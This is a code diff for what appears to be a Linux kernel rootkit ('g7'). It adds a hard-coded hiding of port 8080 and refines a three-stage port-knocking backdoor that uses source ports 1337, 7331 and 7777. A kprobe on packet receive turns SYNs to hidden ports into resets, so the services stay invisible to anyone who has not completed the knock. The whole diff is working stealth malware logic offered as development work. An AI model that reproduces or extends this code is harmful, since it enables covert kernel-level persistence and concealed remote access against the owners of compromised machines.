@@ -93,6 +93,8 @@ hide_lports(void)
 
     if (register_kprobe(&p_rcv_spkt))
         DEBUG_INFO("[g7] Could not insert kprobe p_rcv_spkt\n");
+
+    hide_lport(8080);
 }
 
 void
@@ -163,27 +165,35 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
         if (list_contains_knock(&ips_stage3, ip, version))
             return 0;
 
+        if (tcphdr->syn || !tcphdr->ack)
+            goto check_port;
+
         if (list_contains_knock(&ips_stage2, ip, version)) {
-            if (src_port == 7777)
+            if (src_port == 7777) {
+                DEBUG_NOTICE("[g7] knocked port %d, port knocking sequence completed\n", src_port);
                 add_knock_to_list(&ips_stage3_tail, ip, version);
+	    }
 
             remove_knock_from_list(&ips_stage2, &ips_stage2_tail, ip, version);
-            goto check_port;
         } else if (list_contains_knock(&ips_stage1, ip, version)) {
-            if (src_port == 7331)
+            if (src_port == 7331) {
                 add_knock_to_list(&ips_stage2_tail, ip, version);
+                DEBUG_NOTICE("[g7] knocked port %d, entering knocking stage 2\n", src_port);
+	    }
 
             remove_knock_from_list(&ips_stage1, &ips_stage1_tail, ip, version);
-            goto check_port;
         } else {
-            if (src_port == 1337)
+            if (src_port == 1337) {
+                DEBUG_NOTICE("[g7] knocked port %d, entering knocking stage 1\n", src_port);
                 add_knock_to_list(&ips_stage1_tail, ip, version);
+	    }
         }
 
 check_port:
         if (list_contains_lport(&hidden_lports, src_port))
             if (tcphdr->syn) {
                 tcphdr->syn = 0;
+                tcphdr->ack = 0;
                 tcphdr->rst = 1;
             }
     }
